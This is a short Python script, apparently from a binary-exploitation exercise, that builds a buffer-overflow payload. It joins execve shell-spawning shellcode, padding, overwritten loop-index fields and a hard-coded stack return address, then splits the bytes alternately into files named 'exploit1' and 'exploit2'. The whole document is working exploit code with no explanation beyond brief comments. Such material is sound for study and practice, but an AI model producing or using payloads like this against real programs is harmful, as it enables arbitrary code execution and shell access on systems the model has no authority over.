# take care of endianess
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf_addr = "\x50\xe2\xff\xff\xff\x7f\x00\x00" #"\x00\x00\x7f\xff\xff\xff\xe2\x50" 
byte_read2 = "\x40\x00\x00\x00"
byte_read1 = "\x40\x00\x00\x00"
idx =  "\x50\x00\x00\x00" # this will not jump to index 80 because of ++ at the end of the loop
idx1 = "AAAA" # actually don't care, becaue this will be overwritten soon
idx2 = "AAAA" # actually don't care, becaue this will be overwritten soon
text = shellcode + "A" * (64 - len(shellcode)) + "A" * 12 + byte_read2 + idx + idx2 + idx1 + byte_read1 + "A" * 8 + buf_addr
print(len(text))
out1 = open("exploit1", "w")
out2 = open("exploit2", "w")
total = open("total", "w")
print(len(shellcode))
for c in range(len(text)):
    if c % 2 == 0:
        out1.write(text[c])
    else:
        out2.write(text[c])
    total.write(text[c])
out1.write('A'*100)
out2.write('A'*100)
total.write('A'*200)
out1.close()
out2.close()
